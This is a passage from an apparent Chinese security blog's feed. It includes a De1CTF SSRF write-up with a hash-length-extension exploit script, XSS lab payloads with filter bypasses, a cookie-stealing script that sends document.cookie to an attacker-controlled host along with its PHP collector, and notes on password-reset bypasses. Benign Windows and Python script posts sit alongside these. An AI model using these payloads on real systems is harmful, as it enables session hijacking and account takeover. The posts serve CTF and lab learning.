        &lt;h2 id=&quot;三者用途&quot;&gt;&lt;a href=&quot;#三者用途&quot; class=&quot;headerlink&quot; title=&quot;三者用途&quot;&gt;&lt;/a&gt;三者用途&lt;/h2&gt;&lt;p&gt;首先str是采用Unicode编码方式的序列，主要用于显示。&lt;br&gt;而bytes是字节序列，主要用于网络和文件传输。&lt;br&gt;
      
    
    </summary>
    
      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF SSRF ME</title>
    <link href="http://yoursite.com/2019/08/06/De1CTF%20SSRF%20ME/"/>
    <id>http://yoursite.com/2019/08/06/De1CTF SSRF ME/</id>
    <published>2019-08-06T10:45:16.000Z</published>
    <updated>2019-08-06T10:45:16.071Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSRF-ME"><a href="#SSRF-ME" class="headerlink" title="SSRF ME"></a>SSRF ME</h2><p>考点：哈希长度扩展攻击+flask<br>题目直接给出源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line">#encoding=utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;latin1&apos;)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&apos;code&apos;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&apos;data&apos;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">                result[&apos;data&apos;] = f.read()</span><br><span class="line">            if result[&apos;code&apos;] == 500:</span><br><span class="line">                result[&apos;data&apos;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&apos;code&apos;] = 500</span><br><span class="line">            result[&apos;msg&apos;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.</span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;,port=80)</span><br></pre></td></tr></table></figure></p><p>flask框架的代码，geneSign页面上，用户可以输入param与秘钥和给定的action值为scan进行加密得到哈希值，需要通过这个哈希值进行De1ta页面的请求。<br>在De1ta页面上，从action请求中判断是否存在scan或者read来选择代码执行，默认就只能scan，无法进行read<br>那么我们可以通过<a href="https://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">哈希长度扩展攻击</a>进行绕过，那么就可以先进行scan，再进行read（我是通过利用hashpump攻击进行利用，原理下次再好好研究）。<br>最后一步就行利用urlopen了，过滤了file和gopher，但是可以直接通过输入文件名从而得到flag<br><img src="/img/1564903083666.png" alt=""><br>脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">param = &quot;flag.txt&quot;</span><br><span class="line">data = &quot;scan&quot;</span><br><span class="line">l = len(param) + 16</span><br><span class="line">add = &quot;read&quot;</span><br><span class="line"></span><br><span class="line">def geneSign(param):</span><br><span class="line">gene_url = &quot;http://139.180.128.86/geneSign?param=%s&quot; % param</span><br><span class="line">html = requests.get(gene_url).text</span><br><span class="line">return html</span><br><span class="line"></span><br><span class="line">sign = geneSign(param)</span><br><span class="line">def hashpump(sign,data,l,add):</span><br><span class="line">server_url = &quot;http://192.168.169.149/server.php?sign=%s&amp;data=%s&amp;len=%s&amp;add=%s&quot; % (sign,data,l,add)</span><br><span class="line">html = requests.get(server_url).text</span><br><span class="line">data = html.split(&apos;\n&apos;)</span><br><span class="line">ha = data[0]</span><br><span class="line">action = data[1].replace(&apos;\\x&apos;,&apos;%&apos;)</span><br><span class="line">return (ha,action)</span><br><span class="line"></span><br><span class="line">def De1ta(sign,action,param):</span><br><span class="line">url = &quot;http://139.180.128.86/De1ta?param=%s&quot; % param</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.cookies[&apos;action&apos;] = action</span><br><span class="line">session.cookies[&apos;sign&apos;] = sign</span><br><span class="line"># proxy = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span><br><span class="line">print(session.get(url).text)</span><br><span class="line"></span><br><span class="line">print(geneSign(param))</span><br><span class="line">print(hashpump(sign,data,l,add))</span><br><span class="line">cookie = hashpump(sign,data,l,add)</span><br><span class="line">De1ta(cookie[0],cookie[1],param)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SSRF-ME&quot;&gt;&lt;a href=&quot;#SSRF-ME&quot; class=&quot;headerlink&quot; title=&quot;SSRF ME&quot;&gt;&lt;/a&gt;SSRF ME&lt;/h2&gt;&lt;p&gt;考点：哈希长度扩展攻击+flask&lt;br&gt;题目直接给出源码&lt;br&gt;&lt;figure class=&quot;hi
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>XSS练习靶场</title>
    <link href="http://yoursite.com/2019/07/28/XSS%E7%BB%83%E4%B9%A0%E9%9D%B6%E5%9C%BA/"/>
    <id>http://yoursite.com/2019/07/28/XSS练习靶场/</id>
    <published>2019-07-28T12:48:46.000Z</published>
    <updated>2019-07-28T12:48:46.843Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、DVWA"><a href="#一、DVWA" class="headerlink" title="一、DVWA"></a>一、DVWA</h2><h3 id="1-DOM"><a href="#1-DOM" class="headerlink" title="1.DOM"></a>1.DOM</h3><p>low：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>medium：<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</code><br>注意有的要包裹前面的<br>high：<code>English#&lt;script&gt;alert(1)&lt;/script&gt;</code><br>服务器端过滤的是GET的参数，而前端js使用的是整个url，可以通过#隔开插入js语句</p><h3 id="2-stored和reflect"><a href="#2-stored和reflect" class="headerlink" title="2.stored和reflect"></a>2.stored和reflect</h3><p><code>&lt;img src=1 onerror=alert(1)&gt;</code>通关所有</p><h2 id="二、XSS靶场"><a href="#二、XSS靶场" class="headerlink" title="二、XSS靶场"></a>二、XSS靶场</h2><p>level1：<code>http://xss.tesla-space.com/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</code><br>test字符串在外部</p><p>level2：<code>http://xss.tesla-space.com/level1.php?name=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br>test字符串在属性中</p><p>level3：<code>http://xss.tesla-space.com/level3.php?keyword=&#39; onclick=&#39;alert(1)</code><br>尖括号，双引号都被过滤了，单引号没被过滤，尝试通过单引号闭合并尝试</p><p>level4：<code>http://xss.tesla-space.com/level4.php?keyword=&quot; onclick=&quot;alert(1)</code><br>与level3类似，只是单引号变双引号</p><p>level5：<code>http://xss.tesla-space.com/level5.php?keyword=&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</code><br>过滤了on和srcipt，可以通过javascript伪协议弹窗，a的href属性或者iframe的src属性都可以</p><p>level6：<code>http://xss.tesla-space.com/level6.php?keyword=&quot; oNclick=&quot;alert(1)</code><br>大小写绕过对ON的过滤</p><p>level7：<code>http://xss.tesla-space.com/level7.php?keyword=&quot; oonnclick=&quot;alert(1)</code><br>叠加绕过对on的过滤</p><p>level8：<code>http://xss.tesla-space.com/level8.php?keyword=javascrip%26%23x74%3B%3Aalert%28%2fxss%2f%29</code><br>test值出现在a的src属性中，可以通过伪js代码进行xss，过滤了javascript字符串<br>因为是在属性当中，所以可以通过实体编码绕过，如<code>javascrip&amp;#116;:alert(/xss/)</code>在url传输中需要进行url编码<br><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">编码网站</a></p><p>level9：<code>http://xss.tesla-space.com/level9.php?keyword=javascrip%26%23116%3Aalert%281%29%2f%2fhttp%3A%2f%2fwww.baidu.com</code><br>与level8类似，多了正则匹配http正确网址，在后面加个<code>//</code>和网址就可以绕过</p><p>level10：<code>http://xss.tesla-space.com/level10.php?keyword=sb&amp;t_link=http://www.baidu.comt&amp;t_history=666&amp;t_sort=&quot; onmouseover=&quot;alert(1)&quot; type=&quot;button</code><br>hidden属性中的xss注入，hidden中的值也要测试，可能过滤不严也会出现xss</p><p>level11：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>referrer属性的值在html中出现，并且过滤不严</p><p>level12：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>与11类似，将数据包中的user-agent放在input属性中。</p><p>level13：<code>&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code><br>与11类似，将cookie中的值放在input属性中</p><p>level14：chrome组件exif xss，有点问题没做出来<br>level15：<code>http://xss.tesla-space.com/level15.php?src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code><br>angular js的一点知识，ng-include有包含文件的意思，相当于php的include<br>奇怪的是，我直接访问没法包含，前进后退才成功包含，我也不清楚原因，可以包含同域的第一关页面的xss成功反弹</p><p>level16：<code>http://xss.tesla-space.com/level16.php?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;</code><br>过滤了空格和script，可以用img标签，然后用%0a绕过空格</p><p>level17：<code>http://xss.tesla-space.com/level17.php?arg01=.php/sbasdf/wqer/asdf&amp;arg02= onclick=alert(1) style=display:block;height:500px;width:500px;background:blue;</code><br>也是属性内的xss，但是标签显示不出来，插入style属性，将标签转换为block就能点击</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、DVWA&quot;&gt;&lt;a href=&quot;#一、DVWA&quot; class=&quot;headerlink&quot; title=&quot;一、DVWA&quot;&gt;&lt;/a&gt;一、DVWA&lt;/h2&gt;&lt;h3 id=&quot;1-DOM&quot;&gt;&lt;a href=&quot;#1-DOM&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>制作windows小脚本</title>
    <link href="http://yoursite.com/2019/07/28/%E5%88%B6%E4%BD%9Cwindows%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2019/07/28/制作windows小脚本/</id>
    <published>2019-07-27T17:51:49.000Z</published>
    <updated>2019-07-27T17:51:49.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="bat"><a href="#bat" class="headerlink" title="bat"></a>bat</h2><p>可以创建一个文件，后缀名改为.bat，编辑内容为cmd指令，就可以当做一个脚本来执行了<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br><span class="line">ping www.sina.com</span><br></pre></td></tr></table></figure></p><h2 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h2><p>执行bat脚本如何隐藏，cmd窗口呢，可以通过vbs脚本来打开<br>将一下代码保存为.vbs文件，运行该文件即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set ws = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">ws.run &quot;cmd /c htmer.bat&quot;,vbhide</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;bat&quot;&gt;&lt;a href=&quot;#bat&quot; class=&quot;headerlink&quot; title=&quot;bat&quot;&gt;&lt;/a&gt;bat&lt;/h2&gt;&lt;p&gt;可以创建一个文件，后缀名改为.bat，编辑内容为cmd指令，就可以当做一个脚本来执行了&lt;br&gt;如：&lt;br&gt;&lt;figure class
      
    
    </summary>
    
      <category term="其他" scheme="http://yoursite.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>任意用户密码重置</title>
    <link href="http://yoursite.com/2019/07/22/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2019/07/22/任意用户密码重置/</id>
    <published>2019-07-22T04:06:34.000Z</published>
    <updated>2019-07-22T04:06:34.782Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任意用户密码重置"><a href="#任意用户密码重置" class="headerlink" title="任意用户密码重置"></a>任意用户密码重置</h2><h3 id="1-案例"><a href="#1-案例" class="headerlink" title="1.案例"></a>1.案例</h3><p>1.百度某站任意用户密码重置<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0207468.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2016-0207468.html</a><br>（1）抓重置密码数据包<br>（2）查看数据包中的token<br>（3）查看url中标识身份的数据段<br>（4）发现token与url数据段是一致！！<br>（5）通过使用token构造url进行密码重置<br>2.米鼠网任意用户密码重置<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0211505.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2016-0211505.html</a><br>（1）访问密码找回页面<br>（2）随便输名字burp抓包<br>（3）查看到手机号在请求包和源    代码中<br>（4）查看源代码<br>（5）分析js源码，在验证下一步有一个链接<br>（6）访问该链接成功绕过验证可以修改密码<br>3.国美<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0205445.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2016-0205445.html</a><br>（1）忘记密码提交数据抓取数据包<br>（2）能看到数据包内容有手机号<br>（3）改为自己的<br>（4）短信接收ok<br>（5）密码为1234<br>4.盒子支付某站<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0204835.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2016-0204835.html</a><br>（1）忘记密码提交抓取数据包<br>（2）发送已有手机号，乌云曾经漏洞<br>（3）随便发送验证码，抓返回包<br>（4）显然验证码错误<br>（5）但是json字段将status改为1<br>（6）成功进入下一个页面</p><h3 id="1-2-文章总结"><a href="#1-2-文章总结" class="headerlink" title="1.2.文章总结"></a>1.2.文章总结</h3><p><a href="http://www.anquan.us/static/drops/papers-2035.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/papers-2035.html</a><br>3种类型，爆破秒改和交互<br>爆破类型：（现在应该少）<br>爆破验证码<br>秒改类型：<br>给指定邮箱发送验证url链接<br>有两个参数：用户名+加密的字符串，一般在最后一步进行偷梁换柱</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任意用户密码重置&quot;&gt;&lt;a href=&quot;#任意用户密码重置&quot; class=&quot;headerlink&quot; title=&quot;任意用户密码重置&quot;&gt;&lt;/a&gt;任意用户密码重置&lt;/h2&gt;&lt;h3 id=&quot;1-案例&quot;&gt;&lt;a href=&quot;#1-案例&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>XSS利用</title>
    <link href="http://yoursite.com/2019/07/22/XSS%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2019/07/22/XSS利用/</id>
    <published>2019-07-22T03:57:10.000Z</published>
    <updated>2019-07-22T03:57:10.553Z</updated>
    
    <content type="html"><![CDATA[<h2 id="窃取cookie"><a href="#窃取cookie" class="headerlink" title="窃取cookie"></a>窃取cookie</h2><p>get.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.createElement(&apos;img&apos;).src=&apos;http://192.168.138.1:8001/get.php?cookie=&apos; + document.cookie + &apos;&gt;&apos;</span><br></pre></td></tr></table></figure></p><p>get.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$text = file_get_contents(&quot;./cookie.txt&quot;);</span><br><span class="line"></span><br><span class="line">$text = $text . &quot;\n&quot; . $_GET[&apos;cookie&apos;];</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;./cookie.txt&quot;, $text);</span><br></pre></td></tr></table></figure></p><p>插入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=192.168.169.149:8001/get.js&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;窃取cookie&quot;&gt;&lt;a href=&quot;#窃取cookie&quot; class=&quot;headerlink&quot; title=&quot;窃取cookie&quot;&gt;&lt;/a&gt;窃取cookie&lt;/h2&gt;&lt;p&gt;get.js&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tab
      
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>python脚本-自动上传到hexo</title>
    <link href="http://yoursite.com/2019/07/20/python%E8%84%9A%E6%9C%AC-%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0%E5%88%B0hexo/"/>
    <id>http://yoursite.com/2019/07/20/python脚本-自动上传到hexo/</id>
    <published>2019-07-20T14:05:42.000Z</published>
    <updated>2019-07-20T14:07:56.251Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、压缩与解压"><a href="#一、压缩与解压" class="headerlink" title="一、压缩与解压"></a>一、压缩与解压</h2><p>导入相应模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import shutil</span><br><span class="line">import zipfile</span><br><span class="line">from os.path import join, getsize</span><br></pre></td></tr></table></figure></p><h3 id="1-python压缩指定文件夹"><a href="#1-python压缩指定文件夹" class="headerlink" title="1. python压缩指定文件夹"></a>1. python压缩指定文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def zip_file(src_dir):</span><br><span class="line">    zip_name = src_dir +&apos;.zip&apos;</span><br><span class="line">    z = zipfile.ZipFile(zip_name,&apos;w&apos;,zipfile.ZIP_DEFLATED)</span><br><span class="line">    for dirpath, dirnames, filenames in os.walk(src_dir):</span><br><span class="line">        fpath = dirpath.replace(src_dir,&apos;&apos;)</span><br><span class="line">        fpath = fpath and fpath + os.sep or &apos;&apos;</span><br><span class="line">        for filename in filenames:</span><br><span class="line">            z.write(os.path.join(dirpath, filename),fpath+filename)</span><br><span class="line">            print (&apos;==压缩成功==&apos;)</span><br><span class="line">    z.close()</span><br></pre></td></tr></table></figure><p>其中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">src_dir：你要压缩的文件夹的路径</span><br><span class="line">zip_name：压缩后zip文件的路径及名称</span><br></pre></td></tr></table></figure></p><h3 id="2-python解压zip"><a href="#2-python解压zip" class="headerlink" title="2. python解压zip"></a>2. python解压zip</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def unzip_file(zip_src, dst_dir):</span><br><span class="line">    r = zipfile.is_zipfile(zip_src)</span><br><span class="line">    if r:     </span><br><span class="line">        fz = zipfile.ZipFile(zip_src, &apos;r&apos;)</span><br><span class="line">        for file in fz.namelist():</span><br><span class="line">            fz.extract(file, dst_dir)       </span><br><span class="line">    else:</span><br><span class="line">        print(&apos;This is not zip&apos;)</span><br></pre></td></tr></table></figure><p>其中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip_src:是zip文件的全路径</span><br><span class="line"> </span><br><span class="line">dst_dir：是要解压到的目的文件夹</span><br></pre></td></tr></table></figure></p><h2 id="二、操作文件方法"><a href="#二、操作文件方法" class="headerlink" title="二、操作文件方法"></a>二、操作文件方法</h2><h3 id="1-剪切（移动）文件到指定目录"><a href="#1-剪切（移动）文件到指定目录" class="headerlink" title="1.剪切（移动）文件到指定目录"></a>1.剪切（移动）文件到指定目录</h3><p>主要通过os和shutil库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.move(filename, dst_dir)</span><br></pre></td></tr></table></figure></p><h3 id="2-删除文件夹"><a href="#2-删除文件夹" class="headerlink" title="2.删除文件夹"></a>2.删除文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.rmtree(src_dir)</span><br></pre></td></tr></table></figure><h3 id="3-删除指定文件"><a href="#3-删除指定文件" class="headerlink" title="3.删除指定文件"></a>3.删除指定文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.remove(file_src)</span><br></pre></td></tr></table></figure><h3 id="4-新建文件夹"><a href="#4-新建文件夹" class="headerlink" title="4.新建文件夹"></a>4.新建文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.mkdir(dst_dir)</span><br></pre></td></tr></table></figure><h3 id="5-遍历文件夹"><a href="#5-遍历文件夹" class="headerlink" title="5.遍历文件夹"></a>5.遍历文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for filename in os.listdir(src_dir):</span><br></pre></td></tr></table></figure><h3 id="6-复制文件"><a href="#6-复制文件" class="headerlink" title="6.复制文件"></a>6.复制文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.copyfile(src_file,dst_file)</span><br></pre></td></tr></table></figure><h2 id="三、python文件乱码问题"><a href="#三、python文件乱码问题" class="headerlink" title="三、python文件乱码问题"></a>三、python文件乱码问题</h2><h3 id="1-读文件"><a 